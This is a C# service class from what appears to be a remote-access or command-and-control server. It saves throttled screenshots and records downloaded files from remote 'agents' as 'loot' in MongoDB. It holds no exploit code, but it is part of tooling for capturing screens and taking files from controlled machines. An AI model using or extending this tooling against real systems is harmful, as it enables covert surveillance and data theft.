using System.Collections.Concurrent;
using LibraNextgen.Service.Data;
using LibraNextgen.Service.Models;
using MongoDB.Driver;

namespace LibraNextgen.Service.Services;

/// <summary>
/// Loot library: persists screenshots (throttled) and registers downloads.
/// Files live under <c>AppContext.BaseDirectory/loot</c>, metadata in Mongo.
/// </summary>
public class LootService
{
    private readonly Repository<LootItem> _loot;
    private readonly string _root;
    private readonly ConcurrentDictionary<string, DateTime> _lastScreenshot = new();
    private static readonly TimeSpan ScreenshotThrottle = TimeSpan.FromSeconds(5);

    public LootService(Repository<LootItem> loot)
    {
        _loot = loot;
        _root = Path.Combine(AppContext.BaseDirectory, "loot");
        Directory.CreateDirectory(_root);
    }

    /// <summary>保存一帧完整截图（每 agent 每 5 秒节流，防止屏幕流刷爆磁盘）。</summary>
    public async Task SaveScreenshotAsync(
        string agentId, string jpegBase64, CancellationToken ct = default)
    {
        if (_lastScreenshot.TryGetValue(agentId, out var last) &&
            DateTime.UtcNow - last < ScreenshotThrottle)
            return;
        _lastScreenshot[agentId] = DateTime.UtcNow;

        try
        {
            var bytes = Convert.FromBase64String(jpegBase64);
            if (bytes.Length == 0) return;

            var dir = Path.Combine(_root, Sanitize(agentId));
            Directory.CreateDirectory(dir);
            var name = $"{DateTime.UtcNow:yyyyMMdd_HHmmssfff}.jpg";
            var path = Path.Combine(dir, name);
            await System.IO.File.WriteAllBytesAsync(path, bytes, ct);

            await _loot.InsertAsync(new LootItem
            {
                AgentId = agentId,
                Kind = "screenshot",
                Name = name,
                FilePath = path,
                Size = bytes.Length,
            }, ct);
        }
        catch
        {
            // best-effort: loot must never break the screen stream
        }
    }

    /// <summary>登记一次文件下载。</summary>
    public async Task RecordDownloadAsync(
        string agentId, string name, long size, string path, CancellationToken ct = default)
    {
        try
        {
            await _loot.InsertAsync(new LootItem
            {
                AgentId = agentId,
                Kind = "download",
                Name = name,
                FilePath = path,
                Size = size,
            }, ct);
        }
        catch
        {
            // best-effort
        }
    }

    public async Task<(List<LootItem> items, long total)> GetAsync(
        string? agentId, string? kind, int page, int pageSize, CancellationToken ct = default)
    {
        pageSize = Math.Clamp(pageSize, 1, 80);
        var builder = Builders<LootItem>.Filter;
        var filters = new List<FilterDefinition<LootItem>>();
        if (!string.IsNullOrWhiteSpace(agentId))
            filters.Add(builder.Eq(l => l.AgentId, agentId));
        if (!string.IsNullOrWhiteSpace(kind))
            filters.Add(builder.Eq(l => l.Kind, kind));

        var filter = filters.Count > 0 ? builder.And(filters) : FilterDefinition<LootItem>.Empty;
        var sort = Builders<LootItem>.Sort.Descending(l => l.CreatedAt);
        var items = await _loot.FindPagedAsync(filter, page, pageSize, sort, ct);
        var total = await _loot.CountAsync(filter, ct);
        return (items, total);
    }

    public async Task<LootItem?> GetByIdAsync(string id, CancellationToken ct = default)
        => await _loot.GetByIdAsync(id, ct);

    private static string Sanitize(string s)
        => string.Concat(s.Select(c => char.IsLetterOrDigit(c) || c is '-' or '_' ? c : '_'));
}
